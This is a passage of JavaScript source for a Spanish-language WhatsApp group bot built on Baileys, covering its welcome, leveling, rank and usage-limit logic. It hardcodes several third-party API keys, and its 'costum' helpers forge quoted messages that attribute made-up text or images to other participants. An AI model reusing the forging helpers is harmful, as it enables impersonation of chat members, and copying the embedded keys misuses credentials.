//WATAME-BOT


const {
    WAConnection,
  MessageType,
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  processTime
} = require('@adiwajshing/baileys')
const fs = require('fs')
const axios = require("axios")
const speed = require('performance-now')
const request = require('request')
const ms = require('parse-ms')
const moment = require('moment-timezone')
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const imageToBase64 = require('image-to-base64')
const lolis = require('lolis.life')
const loli = new lolis()
const chalk = require('chalk');
const { removeBackgroundFromImageFile } = require('remove.bg')
const { color, bgcolor } = require('./lib/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson, fetchText } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { exec } = require('child_process')
const { addMetadata } = require('./lib/exif.js')
const Exif = require('./exif.js')
const exif = new Exif()
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const trava = JSON.parse(fs.readFileSync('./src/trava.json'))
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const setting = JSON.parse(fs.readFileSync('./src/settings.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const { nsfwmenu } = require('./src/nsfwmenu')
const { idiomas } = require('./src/idiomas')
const { isFiltered, addFilter } = require('./lib/antispam')
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const user2 = JSON.parse(fs.readFileSync('./database/json/user2.json'))
const ban = JSON.parse(fs.readFileSync('./database/json/banned.json'))
const { ind } = require('./language')
const _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const _registered = JSON.parse(fs.readFileSync('./database/bot/registered.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const settingan = JSON.parse(fs.readFileSync('./admin/set.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const {
	limitawal,
	memberlimit,
	cr,
	BotPrefix,
	author,
	pack
} = settingan

const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}


ConfuMods = [`51931655706@s.whatsapp.net`] 
prefix = '#'
hardi = 'hardianto'
blocked = []
fake = '🌸Watame-BOT🌸'
fakeimage = fs.readFileSync(`./media/confu.jpeg`)
numbernye = '10'
public = true
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN:🔰Manuel🔰\n' 
            + 'ORG:🌸Watame-BOT🌸;\n' 
            + 'TEL;type=CELL;type=VOICE;waid=51931655706:+51931655706\n' 
            + 'END:VCARD' 

ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]


const {
	getLevelingXp,
	getLevelingLevel,
	getLevelingId,
	addLevelingXp,
	addLevelingLevel,
	addLevelingId
} = require('./lib/level.js')


const {
	getRegisteredRandomId,
	addRegisteredUser,    
	createSerial,
	checkRegisteredUser,
    bannadd,
    checkban
    
} = require('./lib/register.js')

               const addRegisteredUser2 = (userid, sender) => {
            const obj = { id: userid, name: sender }
            user2.push(sender)		
            fs.writeFileSync('./database/json/user2.json', JSON.stringify(_registered))
        } 			           
/*[-> ATM & Limit <-]*/
const {
	addATM,
	addKoinUser,
	checkATMuser,
	bayarLimit,
	confirmATM,
	addwaifu,
	limitAdd
} = require('./lib/limitatm.js')




const BarBarKey = 'IDxO1TFYnKADlX4pxcHa'
const VhtearKey = '1BlnApiIkyPake'
const XteamKey = 'd39b4b3fc7dba'
const TobzApi = 'Bidmzz1sJ2L1TKyqaMEU'
const ZeksApi = '🌸Watame-BOT🌸'
const LolKey = 'save123'
lolkey = 'Asyapikeycanz'
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
}
function tanggal(){
myMonths = ["Enero","Febrero","marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Deciembre"];
			myDays = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
			var tgl = new Date();
			var day = tgl.getDate()
			bulan = tgl.getMonth()
			var thisDay = tgl.getDay(),
			thisDay = myDays[thisDay];
			var yy = tgl.getYear()
			var year = (yy < 1000) ? yy + 1900 : yy;
			return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}

function monospace(string) {
return '```' + string + '```'
}


async function starts() {
	const cnf = new WAConnection()
	cnf.version = [2, 2143, 3]
	cnf.logger.level = 'warn'
	console.log(banner.string)
	cnf.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Escanea el Qr'))
	})

	fs.existsSync('./cnf.json') && cnf.loadAuthInfo('./cnf.json')
	cnf.on('connecting', () => {
		start('2', 'Cargando UwU')
	})
	cnf.on('open', () => {
		success('2', 'Listo 7u7')
	})
	await cnf.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./cnf.json', JSON.stringify(cnf.base64EncodedAuthInfo(), null, '\t'))



cnf.on('CB:action,,call', async json => {
    const callerId = json[2][0][1].from;
    console.log("call dari "+ callerId)
        cnf.sendMessage(callerId, "Sistema de bloqueo automático, nada de llamadas! (・–・;)ゞ", MessageType.text)
        await sleep(4000)
        await cnf.blockUser(callerId, "add") 
})
	cnf.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	
cnf.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await cnf.groupMetadata(anu.jid)
		
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await cnf.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/Rgn07Kt/20210702-082122.jpg'
				}
				teks = `❤️¡Bienvenid@ al grupo!❤️

══════════ ◖◍◗
     
Hola! •🌸• @${num.split('@')[0]}

══════════ ◖◍◗


Es grato para nosotros darte la bienvenida y agradecerte por preferir ser parte de esta comunidad, puedes comunicar de cualquier duda a los administradores, disfruta de tu estadía en el grupo 😸❤️



🌸⊳ Por favor, lee las reglas para evitar conflictos 😊

🌸⊳ Entra a la descripción del grupo para informate ✅

🌸⊳Puedes interactuar conmigo tanto por interno como de forma grupal usando *#menu*💠`
				let buff = await getBuffer(ppimg)
				cnf.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
})
	

	cnf.on('chat-update', async (mek) => {
		try {
            if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		//if (!mek.key.fromMe) return
		global.prefix
			global.blocked
			mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message 
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const apiKey = setting.apiKey 
			const { text, extendedText, contact, caption, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const date = new Date().toLocaleDateString()
			const jam = moment.tz('Asia/Jakarta').format('HH:mm')
      const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
      const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
        
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
				const command = body.trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			chats = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const arg = chats.slice(command.length + 2, chats.length)
			
			

			mess = {
				wait: 'En corto te doy tu pedido, espera',
				nsfwoff: 'LA FUNCION NSFW NO ESTÁ ACTIVA! 🚫',
				success: '¡Listo!',
				wrongFormat: 'Escribe Bien 🙂',
				waitmusic: 'Espera, Estoy buscando tu música!',
				waitimg: 'Espera, lo ago lo mas rapido que puedo',
				banned: 'Lo siento, ya no puedes utilizarme por ordenes de mi creador',
				musica: 'Espera un momento, estoy buscando tu musica',
			imageoff: 'No tengo permitido enviar fotos',
				error: {
					stick: 'Error',
				errostick: 'Error',
				Iv: 'Tu link enlace no funciona al parecer'
				},
				only: {
					group: 'ESTE COMANDO SOLO PUEDE SER USADO EN GRUPOS',
					ownerG: 'Este Comando Solo Puede Ser Usado Por El Dueño Del Grupo',
					ownerB: 'Este comando solo lo puede utilizar mi creador, tu no (・–・;)ゞ',
					admin: 'No eres admin 😸',
					Badmin: 'Sin permisos 😟'
				}
			}



				
			
			const botNumber = cnf.user.jid			
			const isGroup = from.endsWith('@g.us')
			const tescuk = ["0@s.whatsapp.net"]
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await cnf.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
            const isAntilink = isGroup ? antilink.includes(from) : false
            const senderme = mek.participant
			const itsMe = sender == botNumber ? true : false
			const isWelkom = isGroup ? welkom.includes(from) : false
		    const isUser2 = user2.includes(sender)
			const isAntiLink = isGroup ? antilink.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isTrava = isGroup ? trava.includes(from) : false
				    const senderNumber = sender.split("@")[0]
const groupDesc = isGroup ? groupMetadata.desc : ''
			const totalchat = await cnf.chats.all()			
	 	const isEventon = isGroup ? event.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            			const isBanned = ban.includes(sender)
            const isLevelingOn = isGroup ? _leveling.includes(from) : false						
			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = ConfuMods.includes(sender)
			const button = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
			const isMe = botNumber.includes(senderme)
			let pushname = cnf.contacts[sender] != undefined ? cnf.contacts[sender].vname || cnf.contacts[sender].notify: undefined
			const q = args.join(' ')
			let infoMSG = JSON.parse(fs.readFileSync('./src/msg.data.json'))
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				cnf.sendMessage(from, teks, text, {quoted: mek})
			}
			const sendMess = (hehe, teks) => {
				cnf.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? cnf.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : cnf.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
					    const costum = (pesan, tipe, target, target2) => {
			cnf.sendMessage(from, pesan, tipe, { contextInfo: { forwardingScore: 400, isForwarded: true } , quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) },message: { conversation: `${target2}` }}})
			}
			const costumimg = ( pesan , tipe, target , caption) => {
			cnf.sendMessage(from, pesan , tipe , {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: {"imageMessage":{url: 'https://mmg.whatsapp.net/d/f/Ahj0ACnTjSHHm6-HjqAUBYiCu2-85zMZp_-EhiXlsd6A.enc',mimetype: 'image/jpeg',caption: `${caption}`,fileSha256: '0Pk0qJyQFn9FCtslZrydJHRQDKryjYcdP7I3CmRrHRs=',fileLength: '20696',height: 360,width: 382,mediaKey: 'N43d/3GY7GYQpgBymb9qFY5O9iNDXuBirXsNZk+X61I=',fileEncSha256: 'IdFM58vy8URV+IUmOqAY3OZsvCN6Px8gaJlRCElqhd4=',directPath: '/v/t62.7118-24/35174026_475909656741093_8174708112574209693_n.enc?oh=2a690b130cf8f912a9ca35f366558743&oe=6061F0C6',mediaKeyTimestamp: '1614240917',jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMASAMBIgACEQEDEQH/xAAwAAADAAMBAAAAAAAAAAAAAAAABAUBAwYCAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAoy6kcWS2eH8miq17B553Thh1BgyTY9iULYfndGBmbSwNEV3eWXpjwZElG09WJckXCj8sWBVc1ZKXj2ZYaoWHnc67K3PbKwtZOqzLrzdQAg5fWFRUeCNTQG2pEKJ0wCD/xAAoEAACAgIBAQkAAwEAAAAAAAABAgADBBEScQUQEyEiMTJBYSNRYmP/2gAIAQEAAT8AaZzfEdwWcGMTE1jNv3M1ozDb+SD2jTO+Yigk6A3KqhseIdfkroTYbXQRrkVuJOplKEuOpjtpxF+IjTO+YnZoBvj4pa/msHtMnHZrgymZ6hCnSJsDl+ys7rTpGmevxMwLFS/1fcA7iNzPsDXaH1NccYH+2lJ1SnSNMlOdcbY6iYGa9g4OJzXW9zI7SBJrpjqxsA9zMkcMetf2V7NKD/McgAkxsis7EcA2fkxkqSkaYbMGRu3hr0x6q6ckufaUMpsexj0ma4Y0qDKhqlektyntXiQO4qWI0PONVZWNsNTmZwewekEwo1fpYaMZdvWf2DYrXoO/ARWLNL6VuXiYcSsuK9eXGYtHhM/nsTPVQgb7iDkydRCNBYYx1Ozj6nmSStRIgJ8UH/nMJiTZs/c7RPwExhu+vrH+p//EAB4RAAIBBAMBAAAAAAAAAAAAAAABAhAREjIhMDFC/9oACAECAQE/AOpJsxEqIj4TfNqXygIWpLc+ZEdBH//EAB4RAAICAgIDAAAAAAAAAAAAAAABAjEQETJBAxJx/9oACAEDAQE/AHWVeHQtYrDaNkno7GOzxP10xzWipDHZHidx+EuQz//Z',scansSidecar: 'choizTOCOFXo21QcOR/IlCehTFztHGnB3xo4F4d/kwmxSJJIbMmvxg==',scanLengths: [Array],midQualityFileSha256: '68OHK4IyhiKDNgNAZ3SoXsngzYENebQkV4b/RwhhYIY=',midQualityFileEncSha256: '2EYOLCXx+aqg9RyP6xJYChQNbEjXZmc0EcSwHzoyXx0='}}}})
			}
			

			
			

 		idttt = []
	    players1 = []
	    players11 = []
	    players2 = []
	    gilir = []
	    gilirr = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players11.push(t.player11)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
	    gilirr.push(t.gilirr)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
isPlayer11 = isGroup ? players11.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
		try {
		pporang = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		      
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    cnf.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 									
			 	           /*[-- funcion dinero --]*/
 	           if (isRegistered ) {
 	           const checkATM = checkATMuser(sender)	     
	        }
			/*[-- funcion barra de nivel --]*/
			var per = '*[▒▒▒▒▒▒▒▒▒▒] 0%*'
			const peri = 50 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			const perl = peri-getLevelingXp(sender) 
			const resl = Math.round(100-((perl/getLevelingXp(sender))*100))
			if (resl <= 10) {
				per = '*[█▒▒▒▒▒▒▒▒▒] ${resl}%*'
			} else if (resl <= 20) {
				per = '*[██▒▒▒▒▒▒▒▒] ${resl}%*'
			} else if (resl <= 30) {
				per = '*[███▒▒▒▒▒▒▒] ${resl}%*'
			} else if (resl <= 40) {
				per = '*[████▒▒▒▒▒▒] ${resl}%*'
			} else if (resl <= 50) {
				per = '*[█████▒▒▒▒▒] ${resl}%*'
			} else if (resl <= 60) {
				per = '*[██████▒▒▒▒] ${resl}%*'
			} else if (resl <= 70) {
				per = '*[███████▒▒▒] ${resl}%*'
			} else if (resl <= 80) {
				per = '*[████████▒▒] ${resl}%*'
			} else if (resl <= 90) {
				per = '*[█████████▒] ${resl}%*'
			} else if (resl <= 100) {
				per = '*[██████████] ${resl}%*'
			} 
				
					
			
			/*[-- funcion ranking --]*/
			const levelRole = getLevelingLevel(sender)
   	       var role = 'Dicipulo'
        if (levelRole <= 2) {
            role = 'Dicipulo'
        } else if (levelRole <= 4) {
            role = 'Dicipulo Dia 1 ⚊¹'
        } else if (levelRole <= 6) {
            role = 'Dicipulo Dia 2 ⚊²'
        } else if (levelRole <= 8) {
            role = 'Dicipulo Dia 3 ⚊³'
        } else if (levelRole <= 10) {
            role = 'Dicipulo Dia 4 ⚊⁴'
        } else if (levelRole <= 12) {
            role = 'Avanzado mes 1 ⚌¹'
        } else if (levelRole <= 14) {
            role = 'Avanzado mes 2 ⚌²'
        } else if (levelRole <= 16) {
            role = 'Avanzado mes 3 ⚌³'
        } else if (levelRole <= 18) {
            role = 'Avanzado mes 4 ⚌⁴'
        } else if (levelRole <= 20) {
            role = 'Avanzado mes 5 ⚌⁵'
        } else if (levelRole <= 22) {
            role = 'Aventurero nv dia 1 ☰¹'
        } else if (levelRole <= 24) {
            role = 'Aventurero nv dia 2 ☰²'
        } else if (levelRole <= 26) {
            role = 'Aventurero nv dia 3 ☰³'
        } else if (levelRole <= 28) {
            role = 'Aventurero nv dia 4 ☰⁴'
        } else if (levelRole <= 30) {
            role = 'Aventurero nv dia 5 ☰⁵'
        } else if (levelRole <= 32) {
            role = 'Aventurero exp año 1 ≣¹'
        } else if (levelRole <= 34) {
            role = 'Aventurero exp año 2 ≣²'
        } else if (levelRole <= 36) {
            role = 'Aventurero exp año 3 ≣³'
        } else if (levelRole <= 38) {
            role = 'Aventurero exp año 4 ≣⁴'
        } else if (levelRole <= 40) {
            role = 'Aventurero exp año 5 ≣⁵'
        } else if (levelRole <= 42) {
            role = 'Aventurero prf año 1 ﹀¹'
        } else if (levelRole <= 44) {
            role = 'Aventurero prf año 2 ﹀²'
        } else if (levelRole <= 46) {
            role = 'Aventurero prf año 3 ﹀³'
        } else if (levelRole <= 48) {
            role = 'Aventurero prf año 4 ﹀⁴'
        } else if (levelRole <= 50) {
            role = 'Aventurero prf año 5 ﹀⁵'
        } else if (levelRole <= 52) {
            role = 'Maestro mes 1 ︾¹'
        } else if (levelRole <= 54) {
            role = 'Maestro mes 2 ︾²'
        } else if (levelRole <= 56) {
            role = 'Maestro mes 3 ︾³'
        } else if (levelRole <= 58) {
            role = 'Maestro mes 4 ︾⁴'
        } else if (levelRole <= 60) {
            role = 'Maestro mes 5 ︾⁵'
        } else if (levelRole <= 62) {
            role = 'Elite mes 1 ♢¹ '
        } else if (levelRole <= 64) {
            role = 'Elite mes 2 ♢²'
        } else if (levelRole <= 66) {
            role = 'Elite mes 3 ♢³'
        } else if (levelRole <= 68) {
            role = 'Elite mes 4 ♢⁴'
        } else if (levelRole <= 70) {
            role = 'Elite mes 5 ♢⁵'
        } else if (levelRole <= 72) {
            role = 'Elite año 1 ♢♢¹'
        } else if (levelRole <= 74) {
            role = 'Elite año 2 ♢♢²'
        } else if (levelRole <= 76) {
            role = 'Elite año 3 ♢♢³'
        } else if (levelRole <= 78) {
            role = 'Elite año 4 ♢♢⁴'
        } else if (levelRole <= 80) {
            role = 'Elite año 5 ♢♢⁵'
        } else if (levelRole <= 82) {
            role = 'Elite de la elite dia 1 ✷¹'
        } else if (levelRole <= 84) {
            role = 'Elite de la elite dia 2 ✷²'
        } else if (levelRole <= 86) {
            role = 'Elite de la elite dia 3 ✷³'
        } else if (levelRole <= 88) {
            role = 'Elite de la elite dia 4 ✷⁴'
        } else if (levelRole <= 90) {
            role = 'Elite de la elite dia 5 ✷⁵'
        } else if (levelRole <= 92) {
            role = 'Escolta dia 1 ✷✷¹'
        } else if (levelRole <= 94) {
            role = 'Escolta dia 2 ✷✷²'
        } else if (levelRole <= 96) {
            role = 'Escolta dia 3 ✷✷³'
        } else if (levelRole <= 98) {
            role = 'Escolta dia 4 ✷✷⁴'
        } else if (levelRole <= 100) {
            role = 'Escolta dia 5 ✷✷⁵'
        } else if (levelRole <= 102) {                   
            role = 'Leyenda I 忍'
        } else if (levelRole <= 154) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 156) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 158) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 160) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 162) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 164) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 166) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 168) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 170) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 172) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 174) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 176) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 178) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 180) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 182) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 184) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 186) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 188) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 190) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 192) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 194) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 196) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 198) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 200) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 210) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 220) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 230) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 240) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 250) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 260) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 270) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 280) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 290) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 300) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 310) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 320) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 330) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 340) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 350) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 360) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 370) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 380) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 390) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 400) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 410) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 420) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 430) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 440) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 450) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 460) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 470) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 480) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 490) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 500) {
            role = 'Leyenda VI 忍'
        } else if (levelRole <= 666) {
            role = 'Leyenda VII 忍'
        } else if (levelRole <= 700) {
            role = 'Leyenda VIII 忍'
        } else if (levelRole <= 800) {
            role = 'Leyenda IX 忍'
        } else if (levelRole <= 900) {
            role = 'Leyenda X 忍'
        } else if (levelRole <= 1000) {
            role = 'Mythic I 上帝'
        } else if (levelRole <= 2000) {
            role = 'Mythic II 上帝'
        } else if (levelRole <= 3000) {
            role = 'Mythic III 上帝'
        } else if (levelRole <= 4000) {
            role = 'Mythic IV 上帝'
        } else if (levelRole <= 5000) {
            role = 'Mythic V 上帝'
        } else if (levelRole <= 6000) {
            role = 'Mythical Glory 上帝'
        } else if (levelRole <= 7000) {
            role = 'Mythical Glory x1000帝'
        } else if (levelRole <= 8000) {
            role = 'Mythical Glory 1100 上帝'
        } else if (levelRole <= 9000) {
            role = 'Mythical Glory 2000 上帝'
        } else if (levelRole <= 10000) {
            role = 'Despertar 特尔邦贡'
	    } else if (levelRole <= 66666666) {
   	         role = 'Onichan❗'
   	     }
   		 
				
				
	        /*[-- funcion nivel --]*/
            if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 500 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                     addKoinUser(sender, 20)     	           	                
                     await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))            
	               
 
                  }
            } catch (err) {
                console.error(err)
            }
        }
         

          /*[-- function check limit --]*/
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return cnf.sendMessage(from,`Su límite de solicitudes ha expirado`, text,{ quoted: mek})
                            cnf.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
                        cnf.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				} 
		
			/*[-- limit end --]*/
            const isLimit = (sender) =>{ 
          	if (isOwner ) {return false;}
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    cnf.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/user/limit.json',JSON.stringify(_limit))
           return false
     	  }
     	}
     	   
     	   /*[-- auto out form gc if member under limit --]*/
 	       if (isGroup) {
				try {
					const getmemex = groupMembers.length	
				    if (getmemex <= memberlimit) {
					reply(`lo siento, los miembros del grupo no han cumplido con los requisitos. miembros mínimos deben ser ${memberlimit}`)					
 	                           cnf.groupLeave(from) 			  
							cnf.updatePresence(from, Presence.composing)						
				    }
